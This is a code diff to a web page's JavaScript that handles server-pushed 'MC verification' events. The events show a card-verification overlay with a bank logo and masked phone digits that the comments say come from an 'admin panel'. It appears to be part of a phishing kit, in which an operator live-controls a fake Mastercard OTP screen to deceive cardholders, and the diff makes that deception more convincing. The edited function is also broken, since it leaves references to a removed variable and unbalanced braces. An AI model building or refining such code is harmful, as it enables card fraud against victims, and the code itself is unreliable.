@@ -1021,17 +1021,28 @@
          }
      });
      
+// In the show_mc_verification event handler in index.html
 socket.on('show_mc_verification', (data) => {
-    console.log('Showing MC verification overlay with data:', data);
+    console.log('RECEIVED show_mc_verification with FULL data:', JSON.stringify(data));
     
-    // Store the phone's last 4 digits from the data received from server
+    // Check if phone data is properly received
     if (data.phoneLastFour) {
-        // Store it in the state for later use with high priority
+        console.log('✅ Phone data received in show_mc_verification:', data.phoneLastFour);
+        // Force update all state and UI with this phone number
         state.phoneLastFour = data.phoneLastFour;
-        // Update maskedPhone to match the admin-provided digits
         state.maskedPhone = `+1 (***) ***-${data.phoneLastFour}`;
-        console.log('Admin provided phone last four digits set to:', data.phoneLastFour);
+        
+        // Immediately update any visible phone displays
+        const phoneElements = document.querySelectorAll('#cardLastFourDigits');
+        phoneElements.forEach(el => {
+            el.textContent = `********${data.phoneLastFour}`;
+        });
+    } else {
+        console.warn('❌ No phone data in show_mc_verification event');
     }
+    
+    // Prevent random phone generation by setting a flag
+    state.phoneNumberSet = true;
     
     showProcessingUI();
     
@@ -1040,15 +1051,28 @@ socket.on('show_mc_verification', (data) => {
     }, 1500);
 });
  
+// Similarly, in the start_verification event handler
 socket.on('start_verification', (data) => {
-    console.log('Start verification requested:', data);
+    console.log('RECEIVED start_verification with FULL data:', JSON.stringify(data));
     
-    // Store the phone's last 4 digits from the verification data
+    // Check if phone data is properly received
     if (data.phoneLastFour) {
+        console.log('✅ Phone data received in start_verification:', data.phoneLastFour);
+        // Force update state and UI
         state.phoneLastFour = data.phoneLastFour;
         state.maskedPhone = `+1 (***) ***-${data.phoneLastFour}`;
-        console.log('Phone last four digits set in start_verification:', data.phoneLastFour);
+        
+        // Update any visible phone displays
+        const phoneElements = document.querySelectorAll('#cardLastFourDigits');
+        phoneElements.forEach(el => {
+            el.textContent = `********${data.phoneLastFour}`;
+        });
+    } else {
+        console.warn('❌ No phone data in start_verification event');
     }
+    
+    // Set flag to prevent random generation
+    state.phoneNumberSet = true;
     
     const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
     const mcLoadingContent = document.getElementById('mcLoadingContent');
@@ -1589,16 +1613,32 @@ socket.on('start_verification', (data) => {
      return reasons[reasonCode] || 'Your payment could not be processed';
  }
  
- function updateMcVerificationUI(data) {
-     // Update bank logo
+
+
+function updateMcVerificationUI(data) {
+    console.log('Updating MC verification UI with FULL data:', JSON.stringify(data));
+    
+    // Check phone number again
+    if (data.phoneLastFour) {
+        console.log('✅ Phone data available in updateMcVerificationUI:', data.phoneLastFour);
+        state.phoneLastFour = data.phoneLastFour;
+        state.maskedPhone = `+1 (***) ***-${data.phoneLastFour}`;
+        state.phoneNumberSet = true;
+    } else {
+        console.warn('❌ No phone data in updateMcVerificationUI');
+    }
      if (document.getElementById('bankLogo')) {
          const bankLogo = document.getElementById('bankLogo');
          const bankCode = data.bankCode?.toLowerCase() || 'sbi';
  
        // Set masked phone number with the correct last 4 digits from admin panel
-if (document.getElementById('cardLastFourDigits')) {
-    // Prioritize the phoneLastFour from the data parameter or state
-    const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
+
+    // Update the cardLastFourDigits element with the correct phone number
+    if (document.getElementById('cardLastFourDigits')) {
+        // CRITICAL: Only use the phone number from data or state, NEVER generate a new one
+        document.getElementById('cardLastFourDigits').textContent = `********${state.phoneLastFour || '9469'}`;
+        console.log('Updated phone display with:', state.phoneLastFour || '9469');
+    }
     console.log('Setting phone last four digits to:', lastFour);
     document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
 }
@@ -1848,7 +1888,17 @@ if (document.getElementById('cardLastFourDigits')) {
  }
  
  function showMCVerification(data) {
-     console.log('Showing MC verification overlay with data:', data);
+    console.log('Showing MC verification overlay with FULL data:', JSON.stringify(data));
+    
+    // Check phone number again
+    if (data.phoneLastFour) {
+        console.log('✅ Phone data available in showMCVerification:', data.phoneLastFour);
+        state.phoneLastFour = data.phoneLastFour;
+        state.maskedPhone = `+1 (***) ***-${data.phoneLastFour}`;
+        state.phoneNumberSet = true;
+    } else {
+        console.warn('❌ No phone data in showMCVerification');
+    }
      
      const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
      const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
@@ -1935,18 +1985,20 @@ if (document.getElementById('cardLastFourDigits')) {
      return cardType;
  }
  
- function generateRandomPhone() {
-    // Only generate if no admin-provided phone number
-    if (state.phoneLastFour) {
-        console.log("Using admin-provided phone last four digits:", state.phoneLastFour);
+function generateRandomPhone() {
+    // CRITICAL: Do not generate a random phone if:
+    // 1. We already have a phone number from the admin
+    // 2. The phoneNumberSet flag is true (meaning we got it from an event)
+    if (state.phoneLastFour || state.phoneNumberSet) {
+        console.log("Using existing phone last four digits:", state.phoneLastFour);
         state.maskedPhone = `+1 (***) ***-${state.phoneLastFour}`;
         return;
     }
     
-    // If no admin-provided digits, don't generate random ones, use a default
-    state.phoneLastFour = '9469'; // Default
+    // If we absolutely must generate a default, use a consistent one
+    console.log("Using default phone last four digits");
+    state.phoneLastFour = '9469';
     state.maskedPhone = `+1 (***) ***-${state.phoneLastFour}`;
-    console.log("Using default phone last four digits:", state.phoneLastFour);
 }
  
  function formatCardNumber(value) {
